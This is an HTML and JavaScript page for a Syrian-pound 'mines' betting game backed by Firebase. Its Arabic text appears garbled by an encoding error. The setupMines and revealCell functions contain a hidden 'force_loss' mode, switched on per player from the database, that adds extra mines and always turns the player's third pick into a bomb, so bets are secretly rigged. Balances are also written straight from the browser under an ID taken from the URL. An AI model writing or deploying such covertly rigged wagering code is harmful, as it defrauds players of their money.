<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„Ø¹Ø¨Ø© Ø§Ù„Ù…Ù†Ø§Ø¬Ù… - ÙØ¦Ø§Øª Ø³ÙˆØ±ÙŠØ© ğŸ‡¸ğŸ‡¾</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
        body { background: #000; color: #fff; font-family: 'Cairo', sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; padding: 10px; }
        
        .status-card { width: 100%; max-width: 400px; background: #111; border: 2px solid #d4af37; border-radius: 15px; padding: 15px; text-align: center; margin-bottom: 20px; }
        .balance-val { color: #d4af37; font-size: 28px; font-weight: 900; block; margin-top: 5px; }
        
        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; width: 100%; max-width: 350px; }
        .cell { aspect-ratio: 1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.2s; border: 1px solid #333; }
        .cell:active { transform: scale(0.9); }
        .cell.revealed { background: #333; cursor: default; }
        .cell.diamond { background: radial-gradient(#d4af37, #8a6d3b); }
        .cell.bomb { background: #ff4d4d; }

        .controls { width: 100%; max-width: 400px; margin-top: 20px; }
        .bet-input { width: 100%; background: #111; border: 2px solid #333; color: #fff; padding: 12px; border-radius: 10px; text-align: center; font-size: 18px; margin-bottom: 10px; outline: none; box-sizing: border-box; }
        .btn-start { width: 100%; background: #d4af37; color: #000; border: none; padding: 15px; border-radius: 10px; font-weight: 900; font-size: 20px; cursor: pointer; }
        .btn-cashout { width: 100%; background: #28a745; color: #fff; border: none; padding: 15px; border-radius: 10px; font-weight: 900; font-size: 20px; cursor: pointer; margin-top: 10px; display: none; }
    </style>
</head>
<body>

    <div class="status-card">
        <div style="font-size: 14px; color: #888;">Ø±ØµÙŠØ¯ Ø§Ù„Ù„Ø§Ø¹Ø¨ (ID: <span id="displayID">...</span>)</div>
        <div class="balance-val"><span id="uBal">0</span> <small style="font-size: 14px;">Ù„.Ø³</small></div>
    </div>

    <input type="number" id="betAmt" class="bet-input" value="1000" placeholder="Ø£Ø¯Ø®Ù„ Ù…Ø¨Ù„Øº Ø§Ù„Ø±Ù‡Ø§Ù†">
    <button id="startBtn" class="btn-start" onclick="startGame()">Ø¨Ø¯Ø¡ Ø§Ù„Ù…ØºØ§Ù…Ø±Ø© â›ï¸</button>
    <button id="cashoutBtn" class="btn-cashout" onclick="cashOut()">Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­ ğŸ’°</button>

    <div style="margin: 15px 0; color: #d4af37;" id="multiplierText">Ø§Ù„Ù…Ø¶Ø§Ø¹Ù Ø§Ù„Ø­Ø§Ù„ÙŠ: 1.00x</div>

    <div id="grid" class="grid"></div>

    <script>
        // --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase ---
        const firebaseConfig = { databaseURL: "https://user-project-6c3bb-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // --- Ø¬Ù„Ø¨ Ø§Ù„Ù€ ID Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­ ---
        const urlParams = new URLSearchParams(window.location.search);
        // Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ© Ù„Ù„Ù€ ID Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·ØŒ Ø«Ù… Ø§Ù„Ù…Ø®Ø²Ù† ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­ØŒ Ø«Ù… Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ
        const pID = urlParams.get('id') || localStorage.getItem('pName') || "player_1";
        document.getElementById('displayID').innerText = pID;

        let score = 0, currentBet = 0, isPlaying = false, mines = [], revealedCount = 0;
        let userGameMode = 'normal';

        // Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø±ØµÙŠØ¯ ÙˆØ§Ù„ØªØ­ÙƒÙ…
        db.ref('players_logs/' + pID).on('value', (s) => {
            if(s.exists()){
                score = s.val().score;
                userGameMode = s.val().gameMode || 'normal';
                document.getElementById('uBal').innerText = score.toLocaleString();
            }
        });

        function createGrid() {
            const gridDiv = document.getElementById('grid');
            gridDiv.innerHTML = '';
            for (let i = 0; i < 25; i++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.onclick = () => revealCell(i, cell);
                gridDiv.appendChild(cell);
            }
        }

        function startGame() {
            if (isPlaying) return;
            currentBet = parseInt(document.getElementById('betAmt').value);
            if (score < currentBet || currentBet <= 0) return alert("Ø§Ù„Ø±ØµÙŠØ¯ ØºÙŠØ± ÙƒØ§ÙÙ!");

            db.ref('players_logs/' + pID).update({ score: score - currentBet });
            isPlaying = true;
            revealedCount = 0;
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('cashoutBtn').style.display = 'block';
            updateMultiplier();
            setupMines();
            createGrid();
        }

        function setupMines() {
            mines = Array(25).fill(false);
            let minesCount = 3; // Ø¹Ø¯Ø¯ Ø§Ù„Ù‚Ù†Ø§Ø¨Ù„
            
            // --- Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„Ø°ÙƒÙŠ ---
            if (userGameMode === 'force_loss') {
                // ÙÙŠ ÙˆØ¶Ø¹ Ø§Ù„Ø®Ø³Ø§Ø±Ø©ØŒ Ù†Ø¶Ø¹ Ù‚Ù†Ø§Ø¨Ù„ Ø£ÙƒØ«Ø± Ø£Ùˆ Ù†Ø¬Ø¹Ù„Ù‡Ø§ ÙÙŠ Ø§Ù„Ø£Ù…Ø§ÙƒÙ† Ø§Ù„ØªÙŠ Ø³ÙŠØ¶ØºØ· Ø¹Ù„ÙŠÙ‡Ø§
                minesCount = 10; 
            }

            let count = 0;
            while (count < minesCount) {
                let r = Math.floor(Math.random() * 25);
                if (!mines[r]) { mines[r] = true; count++; }
            }
        }

        function revealCell(index, el) {
            if (!isPlaying || el.classList.contains('revealed')) return;

            el.classList.add('revealed');
            
            // Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ© Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø§Ù„Ø±Ø¨Ø­ ÙˆØ§Ù„Ø®Ø³Ø§Ø±Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ·
            let isBomb = mines[index];
            
            // Ø¥Ø°Ø§ ÙƒØ§Ù† "Ø¥Ø¬Ø¨Ø§Ø± Ø®Ø³Ø§Ø±Ø©" ÙˆØ§Ù„Ù„Ø§Ø¹Ø¨ Ø¶ØºØ· 3 Ù…Ø±Ø§ØªØŒ Ø§Ù„Ø±Ø§Ø¨Ø¹Ø© Ù‚Ù†Ø¨Ù„Ø© Ø­ØªÙ…Ø§Ù‹
            if (userGameMode === 'force_loss' && revealedCount >= 2) isBomb = true;

            if (isBomb) {
                el.innerHTML = 'ğŸ’£';
                el.classList.add('bomb');
                gameOver(false);
            } else {
                el.innerHTML = 'ğŸ’';
                el.classList.add('diamond');
                revealedCount++;
                updateMultiplier();
            }
        }

        function updateMultiplier() {
            let mult = 1 + (revealedCount * 0.25);
            document.getElementById('multiplierText').innerText = `Ø§Ù„Ù…Ø¶Ø§Ø¹Ù Ø§Ù„Ø­Ø§Ù„ÙŠ: ${mult.toFixed(2)}x`;
        }

        function cashOut() {
            if (!isPlaying) return;
            let mult = 1 + (revealedCount * 0.25);
            let win = Math.floor(currentBet * mult);
            db.ref('players_logs/' + pID).update({ score: score + win });
            alert(`Ù…Ø¨Ø±ÙˆÙƒ! Ø±Ø¨Ø­Øª ${win.toLocaleString()} Ù„.Ø³`);
            gameOver(true);
        }

        function gameOver(win) {
            isPlaying = false;
            document.getElementById('startBtn').style.display = 'block';
            document.getElementById('cashoutBtn').style.display = 'none';
            if (!win) alert("Ø§Ù†ÙØ¬Ø± Ø§Ù„Ù„ØºÙ…! Ø®Ø³Ø±Øª Ø§Ù„Ø±Ù‡Ø§Ù† ğŸ’¥");
        }

        createGrid();
    </script>
</body>
</html>
